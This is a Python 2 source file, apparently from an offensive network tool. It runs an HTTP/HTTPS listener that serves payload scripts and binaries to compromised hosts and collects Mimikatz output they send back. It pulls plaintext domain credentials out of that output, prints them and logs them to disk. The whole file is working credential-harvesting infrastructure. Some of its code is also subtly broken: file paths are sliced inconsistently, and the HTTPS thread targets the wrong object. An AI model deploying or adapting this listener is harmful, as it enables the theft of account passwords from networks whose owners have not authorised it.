from BaseHTTPServer import BaseHTTPRequestHandler
from threading import Thread
from core.logger import *
from datetime import datetime
from StringIO import StringIO
import core.settings as settings
import os
import BaseHTTPServer
import ssl

class MimikatzServer(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        print_message("%s - - %s" % (self.client_address[0], format%args))

    def do_GET(self):
        if self.path[5:] in os.listdir('hosted'):
            self.send_response(200)
            self.end_headers()
            with open('hosted/'+ self.path[4:], 'r') as script:
                self.wfile.write(script.read())

        elif settings.args.path:
            if self.path[6:] == settings.args.path.split('/')[-1]:
                self.send_response(200)
                self.end_headers()
                with open(settings.args.path, 'rb') as rbin:
                    self.wfile.write(rbin.read())

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers.getheader('content-length'))
        data = self.rfile.read(length)

        if settings.args.mimikatz:
            buf = StringIO(data).readlines()
            i = 0
            while i < len(buf):
                if ('Password' in buf[i]) and ('(null)' not in buf[i]):
                    passw  = buf[i].split(':')[1].strip()
                    if len(passw) != 719: #Sometimes mimikatz gives long hexstrings instead of clear text passwords
                        domain = buf[i-1].split(':')[1].strip()
                        user   = buf[i-2].split(':')[1].strip()
                        print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
                i += 1

        elif settings.args.mimi_cmd:
            print data

        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
        with open('logs/' + log_name, 'w') as creds:
            creds.write(data)
        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))

def http_server():
    http_server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
    t = Thread(name='http_server', target=http_server.serve_forever)
    t.setDaemon(True)
    t.start()

def https_server():
    server = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
    server.socket = ssl.wrap_socket(server.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
    t = Thread(name='https_server', target=http_server.serve_forever)
    t.setDaemon(True)
    t.start()